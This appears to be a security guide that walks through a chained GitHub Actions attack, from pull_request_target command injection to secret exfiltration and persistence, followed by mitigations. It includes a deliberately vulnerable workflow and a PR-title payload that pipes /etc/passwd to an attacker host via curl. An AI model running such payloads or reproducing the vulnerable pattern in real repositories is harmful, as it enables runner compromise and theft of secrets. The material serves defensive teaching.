# Advanced Attack Scenario 1: Chaining Vulnerabilities for a Full Repository Takeover

This scenario demonstrates how an attacker can chain multiple vulnerabilities together to achieve a full repository takeover. The attack starts with a command injection vulnerability in a workflow that is triggered on `pull_request_target`, and ends with the attacker gaining full control of the repository.

## Stage 1: Initial Access

**Vulnerability:** Command injection in a workflow that is triggered on `pull_request_target`.

**Vulnerable Code:**

```yaml
name: Vulnerable Workflow
on:
  pull_request_target:
    types: [opened]
jobs:
  vulnerable_job:
    runs-on: ubuntu-latest
    steps:
      - name: Vulnerable Step
        run: |
          echo "Running command with PR title: ${{ github.event.pull_request.title }}"
```

**Malicious Payload:**

An attacker can create a pull request with the title:

```
'; curl http://attacker.com/$(cat /etc/passwd | base64)
```

**Expected Outcome:**

The workflow will execute the `curl` command, sending the base64-encoded contents of the `/etc/passwd` file to the attacker's server.

## Stage 2: Privilege Escalation

**Vulnerability:** The self-hosted runner is not properly isolated.

**Technique:**

Once the attacker has gained initial access to the runner, they can use a variety of techniques to escalate their privileges. For example, they can use a kernel exploit to gain root access to the host machine.

**Expected Outcome:**

The attacker gains root access to the host machine.

## Stage 3: Lateral Movement

**Vulnerability:** The compromised runner is part of a runner group with access to other repositories.

**Technique:**

Once the attacker has gained root access to the host machine, they can use the runner's credentials to pivot to other runners in the same runner group. This can give them access to other repositories and secrets.

**Expected Outcome:**

The attacker gains access to other repositories and secrets.

## Stage 4: Secret Exfiltration

**Vulnerability:** Secrets are not properly protected.

**Technique:**

Once the attacker has gained access to other repositories and secrets, they can exfiltrate them to their own server. For example, they can use the `curl` command to send the secrets to their server.

**Expected Outcome:**

The attacker exfiltrates the secrets to their own server.

## Stage 5: Persistence

**Vulnerability:** The attacker is able to establish persistence on the compromised runner.

**Technique:**

Once the attacker has exfiltrated the secrets, they can establish persistence on the compromised runner. For example, they can create a new user account with a password that they control.

**Expected Outcome:**

The attacker establishes persistence on the compromised runner.

## Mitigation

*   **Stage 1:** Use environment variables to pass untrusted input to your workflows.
*   **Stage 2:** Use a container to isolate your self-hosted runners from the host machine.
*   **Stage 3:** Use separate runner groups for each repository.
*   **Stage 4:** Use a secrets management solution to protect your secrets.
*   **Stage 5:** Use a host-based intrusion detection system (HIDS) to monitor for suspicious activity on your self-hosted runners.
